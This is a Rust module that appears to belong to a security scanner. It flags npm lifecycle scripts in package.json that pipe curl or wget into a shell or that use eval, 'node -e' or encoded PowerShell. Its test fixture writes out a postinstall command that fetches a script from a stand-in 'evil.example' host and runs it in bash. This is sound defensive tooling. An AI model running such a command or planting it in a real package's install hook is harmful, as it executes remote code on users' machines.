use anyhow::Result;
use regex::Regex;
use serde_json::Value;
use std::fs;
use std::path::{Path, PathBuf};

use crate::scan::rel_display;
use crate::{Finding, FindingSeverity};

const DANGEROUS: &[&str] = &[
    "preinstall",
    "postinstall",
    "preuninstall",
    "install",
    "prepare",
];

pub fn scan(root: &Path, files: &[PathBuf]) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();
    let curl_bash = Regex::new(r"(?i)(curl|wget).*\|\s*(ba)?sh").unwrap();
    let eval_fetch = Regex::new(r"(?i)\beval\s*\(|node\s+-e\s+|powershell\s+-enc").unwrap();

    for path in files {
        let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
        if name != "package.json" {
            continue;
        }
        let Ok(text) = fs::read_to_string(path) else {
            continue;
        };
        let Ok(v) = serde_json::from_str::<Value>(&text) else {
            continue;
        };
        let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else {
            continue;
        };

        for (script_name, cmd) in scripts {
            let Some(cmd) = cmd.as_str() else { continue };
            let is_lifecycle = DANGEROUS
                .iter()
                .any(|d| script_name.eq_ignore_ascii_case(d));
            let dangerous_pipe = curl_bash.is_match(cmd);
            let evalish = eval_fetch.is_match(cmd);

            if is_lifecycle
                && (dangerous_pipe || evalish || cmd.contains("chmod +x") && cmd.contains("http"))
            {
                findings.push(Finding {
                    id: format!(
                        "scripts/lifecycle/{}/{}",
                        rel_display(root, path).display(),
                        script_name
                    ),
                    detector: "scripts".into(),
                    severity: FindingSeverity::High,
                    title: format!("Dangerous npm lifecycle script: {script_name}"),
                    message: format!(
                        "`{script_name}` in {} runs a high-risk installer pattern",
                        rel_display(root, path).display()
                    ),
                    file: Some(rel_display(root, path)),
                    line: None,
                    evidence: Some(truncate(cmd, 120)),
                    remediation: Some(
                        "Remove remote installers from lifecycle scripts; vendor needed tools or use audited packages."
                            .into(),
                    ),
                });
            } else if dangerous_pipe {
                findings.push(Finding {
                    id: format!(
                        "scripts/curl-bash/{}/{}",
                        rel_display(root, path).display(),
                        script_name
                    ),
                    detector: "scripts".into(),
                    severity: FindingSeverity::Medium,
                    title: format!("curl|bash pattern in script: {script_name}"),
                    message: format!(
                        "Script `{script_name}` pipes remote content into a shell",
                        ),
                    file: Some(rel_display(root, path)),
                    line: None,
                    evidence: Some(truncate(cmd, 120)),
                    remediation: Some(
                        "Download, verify checksums/signatures, then execute — never pipe curl to bash.".into(),
                    ),
                });
            }
        }
    }

    Ok(findings)
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn detects_postinstall_curl_bash() {
        let dir = tempdir().unwrap();
        let pkg = dir.path().join("package.json");
        fs::write(
            &pkg,
            r#"{"name":"x","scripts":{"postinstall":"curl -fsSL https://evil.example/i.sh | bash"}}"#,
        )
        .unwrap();
        let findings = scan(dir.path(), &[pkg]).unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, FindingSeverity::High);
    }
}
